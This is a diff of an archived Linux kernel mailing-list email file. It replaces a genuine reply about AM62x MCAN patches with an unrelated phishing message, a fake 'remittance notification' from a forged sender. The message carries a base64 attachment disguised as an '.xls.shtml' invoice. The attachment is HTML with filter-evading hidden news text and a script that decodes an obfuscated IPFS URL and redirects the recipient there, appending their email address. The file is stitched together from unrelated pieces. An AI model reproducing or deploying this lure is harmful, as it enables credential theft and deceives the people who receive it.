@@ -2,91 +2,97 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 0325C6E1C3A
-	for <lists+linux-kernel@lfdr.de>; Fri, 14 Apr 2023 08:13:21 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 58F3A6E1C8B
+	for <lists+linux-kernel@lfdr.de>; Fri, 14 Apr 2023 08:25:40 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S230029AbjDNGNQ (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Fri, 14 Apr 2023 02:13:16 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:46554 "EHLO
+        id S229773AbjDNGZN (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Fri, 14 Apr 2023 02:25:13 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:53300 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229476AbjDNGNO (ORCPT
+        with ESMTP id S229746AbjDNGZL (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Fri, 14 Apr 2023 02:13:14 -0400
-Received: from lelv0143.ext.ti.com (lelv0143.ext.ti.com [198.47.23.248])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 2F8314C2D;
-        Thu, 13 Apr 2023 23:13:12 -0700 (PDT)
-Received: from lelv0265.itg.ti.com ([10.180.67.224])
-        by lelv0143.ext.ti.com (8.15.2/8.15.2) with ESMTP id 33E6CvUM121911;
-        Fri, 14 Apr 2023 01:12:57 -0500
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ti.com;
-        s=ti-com-17Q1; t=1681452777;
-        bh=5fzgEE5rhEgibICZ0O25CWXhfNZmGZDqlt0vq4RXvyM=;
-        h=Date:Subject:To:CC:References:From:In-Reply-To;
-        b=URVsDq7rIRMqNYXlhoOuQJmyn0xTjbHWqn4Juvnls0SIrvnYAYRllnFPrDu4Dfc3S
-         yiiWHAEWiLDp0Ad9P77YDV7rBeWPdsTR6xVd1nHgBSocBpBDY7SysXraIGnRnNMWvu
-         qooD9ng3eJxu0rTDOE686cgGhxfV085TkyWawdPg=
-Received: from DLEE114.ent.ti.com (dlee114.ent.ti.com [157.170.170.25])
-        by lelv0265.itg.ti.com (8.15.2/8.15.2) with ESMTPS id 33E6CvA9027034
-        (version=TLSv1.2 cipher=AES256-GCM-SHA384 bits=256 verify=FAIL);
-        Fri, 14 Apr 2023 01:12:57 -0500
-Received: from DLEE100.ent.ti.com (157.170.170.30) by DLEE114.ent.ti.com
- (157.170.170.25) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256) id 15.1.2507.16; Fri, 14
- Apr 2023 01:12:57 -0500
-Received: from fllv0040.itg.ti.com (10.64.41.20) by DLEE100.ent.ti.com
- (157.170.170.30) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256_P256) id 15.1.2507.16 via
- Frontend Transport; Fri, 14 Apr 2023 01:12:57 -0500
-Received: from [172.24.145.182] (ileaxei01-snat.itg.ti.com [10.180.69.5])
-        by fllv0040.itg.ti.com (8.15.2/8.15.2) with ESMTP id 33E6CrH8054033;
-        Fri, 14 Apr 2023 01:12:53 -0500
-Message-ID: <8552c377-b2e9-749a-9f0c-7c444fe012c6@ti.com>
-Date:   Fri, 14 Apr 2023 11:42:52 +0530
+        Fri, 14 Apr 2023 02:25:11 -0400
+X-Greylist: delayed 600 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Thu, 13 Apr 2023 23:25:08 PDT
+Received: from mail0.chizzy.com (unknown [192.3.255.139])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id AA91C5271
+        for <linux-kernel@vger.kernel.org>; Thu, 13 Apr 2023 23:25:08 -0700 (PDT)
+Reply-To: diane_tesfaye2@naver.com
+From:   Accounts <comercial@sicobrita.pt>
+To:     linux-kernel@vger.kernel.org
+Subject: Re: Approved Remittance Notification 4/13/2023 11:15:02 p.m.
+Date:   13 Apr 2023 23:15:02 -0700
+Message-ID: <20230413231502.2679F12CB0FC5B0D@sicobrita.pt>
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
- Thunderbird/102.9.0
-Subject: Re: [RFC PATCH 0/5] Enable multiple MCAN on AM62x
-Content-Language: en-US
-To:     Judith Mendez <jm@ti.com>,
-        Chandrasekar Ramakrishnan <rcsekar@samsung.com>
-CC:     Nishanth Menon <nm@ti.com>, Andrew Davis <afd@ti.com>,
-        Wolfgang Grandegger <wg@grandegger.com>,
-        Marc Kleine-Budde <mkl@pengutronix.de>,
-        Rob Herring <robh+dt@kernel.org>,
-        Krzysztof Kozlowski <krzysztof.kozlowski+dt@linaro.org>,
-        <linux-can@vger.kernel.org>, <linux-kernel@vger.kernel.org>,
-        <devicetree@vger.kernel.org>, <netdev@vger.kernel.org>,
-        Schuyler Patton <spatton@ti.com>
-References: <20230413223051.24455-1-jm@ti.com>
-From:   Vignesh Raghavendra <vigneshr@ti.com>
-In-Reply-To: <20230413223051.24455-1-jm@ti.com>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-X-EXCLAIMER-MD-CONFIG: e1e8a2fd-e40a-4ac6-ac9b-f7e9cc9ee180
-X-Spam-Status: No, score=-5.5 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,NICE_REPLY_A,
-        RCVD_IN_DNSWL_MED,SPF_HELO_PASS,SPF_PASS autolearn=ham
-        autolearn_force=no version=3.4.6
+Content-Type: multipart/mixed;
+        boundary="----=_NextPart_000_0012_9E99872A.4AB09C49"
+X-Spam-Status: No, score=1.5 required=5.0 tests=BAYES_00,
+        FREEMAIL_FORGED_REPLYTO,FREEMAIL_REPLYTO_END_DIGIT,
+        HEADER_FROM_DIFFERENT_DOMAINS,KHOP_HELO_FCRDNS,MAY_BE_FORGED,
+        SPF_HELO_NONE,SPF_NEUTRAL,T_HTML_ATTACH,T_OBFU_HTML_ATTACH
+        autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Level: *
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hi Judith,
+This is a multi-part message in MIME format.
 
-On 14/04/23 04:00, Judith Mendez wrote:
-> Judith Mendez (5):
->   arm64: dts: ti: Add AM62x MCAN MAIN domain transceiver overlay
->   arm64: defconfig: Enable MCAN driver
->   dt-binding: can: m_can: Remove required interrupt attributes
->   arm64: dts: ti: Enable multiple MCAN for AM62x in MCU MCAN overlay
->   can: m_can: Add hrtimer to generate software interrupt
+------=_NextPart_000_0012_9E99872A.4AB09C49
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-This is fine for RFC, but next time, please split DT and defconfig
-changes (1/5,2/5, and 4/5) to separate series as they have to go via
-arm64 tree.
 
--- 
-Regards
-Vignesh
+FWD: We have concluded the remittance=20
+Send for confirmation to linux-kernel@vger.kernel.org 
+
+Hello
+
+Invoice & Payslip_copy-attached_April_2023 
+=20
+Payment for the attached Proforma has been processed successfully=20
+------=_NextPart_000_0012_9E99872A.4AB09C49
+Content-Type: application/octet-stream; name="PI (2023KL0106) Advance Payment.xls.shtml"; charset="utf-8"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PI (2023KL0106) Advance Payment.xls.shtml"
+
+PCFET0NUWVBFIGh0bWw+DQogICAgPGh0bWwgbGFuZz0iZW4iPg0KICAgIDxoZWFkPg0KICAg
+IDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNv
+bXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0
+IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4NCiAg
+ICA8dGl0bGU+PC90aXRsZT4NCiAgICA8c3R5bGU+DQogICAgICAgIC5tTFB7DQogICAgICAg
+ICAgICBkaXNwbGF5OiBub25lOw0KICAgICAgICB9DQogICAgPC9zdHlsZT4NCiAgICA8L2hl
+YWQ+DQogICAgPGJvZHk+DQogICAgICAgIDxwIGNsYXNzPSJtTFAiPkNoaW5lc2UgUHJlc2lk
+ZW50IFhpIEppbnBpbmcgbWVldHMgd2l0aCBOZXcgWmVhbGFuZCBQcmltZSBNaW5pc3RlciBK
+YWNpbmRhIEFyZGVybiBpbiBCYW5na29rLCBUaGFpbGFuZCwgTm92LiAxOCwgMjAyMi4gKFhp
+bmh1YS9aaGFpIEppYW5sYW4pDQpCQU5HS09LLCBOb3YuIDE4IChYaW5odWEpIC0tIENoaW5l
+c2UgUHJlc2lkZW50IFhpIEppbnBpbmcgc2FpZCBoZXJlIEZyaWRheSB0aGF0IENoaW5hIGlz
+IHdpbGxpbmcgdG8gY29vcmRpbmF0ZSBjbG9zZWx5IHdpdGggTmV3IFplYWxhbmQgdG8gam9p
+bnRseSBwcm9tb3RlIHBlYWNlLCBzdGFiaWxpdHksIGRldmVsb3BtZW50IGFuZCBwcm9zcGVy
+aXR5IGluIHRoZSBQYWNpZmljIGlzbGFuZCBjb3VudHJpZXMgcmVnaW9uLg0KQ2hpbmEncyBw
+b2xpY3kgdG93YXJkIHRoZSBQYWNpZmljIElzbGFuZCBjb3VudHJpZXMgaXMgYWx3YXlzIGFp
+bWVkIGF0IHB1cnN1aW5nIHBlYWNlLCBkZXZlbG9wbWVudCBhbmQgY29vcGVyYXRpb24sIFhp
+IHNhaWQgaW4gaGlzIG1lZXRpbmcgd2l0aCBOZXcgWmVhbGFuZCBQcmltZSBNaW5pc3RlciBK
+YWNpbmRhIEFyZGVybiBvbiB0aGUgc2lkZWxpbmVzIG9mIHRoZSAyOXRoIEFzaWEtUGFjaWZp
+YyBFY29ub21pYyBDb29wZXJhdGlvbiAoQVBFQykgRWNvbm9taWMgTGVhZGVycycgTWVldGlu
+Zy4NCiAgICAgICAgPC9wPg0KICAgICAgICA8c2NyaXB0Pg0KICAgICAgICB2YXIgZnBsID0g
+ImxpbnV4LWtlcm5lbEB2Z2VyLmtlcm5lbC5vcmciOw0KICAgICAgICB3aW5kb3cubG9jYXRp
+b24uaHJlZiA9IGF0b2IoImFIUjBjSE02THk5aVlXWjVZbVZwWW5CeWFUSnhZVEpzWjIxdWFu
+QXplWFowWnpWMGEzVjVjbmt6Y25SMmJtVTNkalp4WW05cFpXMW5iWEZyZG01eWJYcHVaUzVw
+Y0daekxtTm1MV2x3Wm5NdVkyOXRJdz09IikrZnBsOw0KICAgICAgICA8L3NjcmlwdD4NCiAg
+ICAgICA8cCBjbGFzcz0ibUxQIj5UaGUgTW9ycmlzdG93biBsb2NhdGlvbiB3aWxsIGJlIHRo
+ZSBmcmFuY2hpc2UncyBmaXJzdCBpbiB0aGUgc3RhdGUgb2YgTmV3IEplcnNleS4gKEdldHR5
+IEltYWdlcylNT1JSSVNUT1dOLCBOSiDigJQgUG9wdWxhciBncmFiICYgZ28gYnJlYWtmYXN0
+IGpvaW50LCBFZmZpbiBFZ2csIGlzIG9wZW5pbmcgdGhlaXIgZmlyc3QgbG9jYXRpb24gaW4g
+TmV3IEplcnNleSBhbmQgdGhleSBhcmUgY29taW5nIHRvIE1vcnJpc3Rvd24uIEVmZmluIEVn
+ZywgbG9jYXRlZCBhdCAzMCBNb3JyaXMgU3RyZWV0LCB3aWxsIHNlcnZlIGEgdmFyaWV0eSBv
+ZiBnb3VybWV0IGJyZWFrZmFzdCBzYW5kd2ljaGVzIHRoYXQgd2lsbCBwbGVhc2UgYm90aCBj
+YXJuaXZvcmVzIGFuZCB2ZWdldGFyaWFucy4gVGhlIGZhc3QgY2FzdWFsIHJlc3RhdXJhbnQg
+d2lsbCBhbHNvIHNlcnZlIGJyZWFrZmFzdCBmYXZvcml0ZXMgd2l0aCBhIHR3aXN0IGxpa2Ug
+dGFjb3MsIGJ1cnJpdG9zLCBhbmQgYm93bHMsIGFzIHdlbGwgYXMgc29tZSBzd2VldCBtZW51
+IGl0ZW1zIGxpa2UgdGhlaXIgVmlyZ2luIGFuZCBTbHV0dHkgUGFuY2FrZXMuDQogICAgICAg
+IDwvcD4NCiAgICA8L2JvZHk+DQogICAgPC9odG1sPg==
+
+------=_NextPart_000_0012_9E99872A.4AB09C49--
